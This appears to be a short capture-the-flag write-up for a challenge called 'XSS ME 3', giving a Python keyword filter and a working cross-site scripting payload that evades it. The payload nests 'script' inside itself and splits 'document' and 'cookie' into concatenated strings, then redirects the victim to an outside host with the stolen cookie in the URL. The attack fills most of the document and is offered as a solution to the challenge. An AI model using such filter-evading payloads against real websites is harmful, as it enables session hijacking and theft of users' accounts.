XSS ME 3
Write a payload to be sent to the bot! Your goal is to steal his cookies.

You have to bypass this filter:

def filter_3(payload):
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")


Working Payload

<scrscriptipt>window["docu"+"ment"].location.replace("//xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/?c="+window["docu"+"ment"]["cook"+"ie"])</scrscriptipt>
